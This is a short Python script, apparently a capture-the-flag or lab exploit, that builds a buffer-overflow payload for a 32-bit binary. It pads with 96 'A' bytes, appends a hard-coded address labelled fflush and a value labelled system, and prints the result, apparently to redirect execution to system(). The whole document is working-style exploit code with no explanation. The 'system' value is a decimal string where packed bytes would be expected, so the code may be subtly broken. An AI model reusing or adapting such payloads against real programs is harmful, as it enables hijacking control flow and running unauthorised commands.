padding = 'A' * 96
fflush = "\x04\xa0\x04\x08"
system = "134514147" 

payload = padding + fflush + system

print(payload)
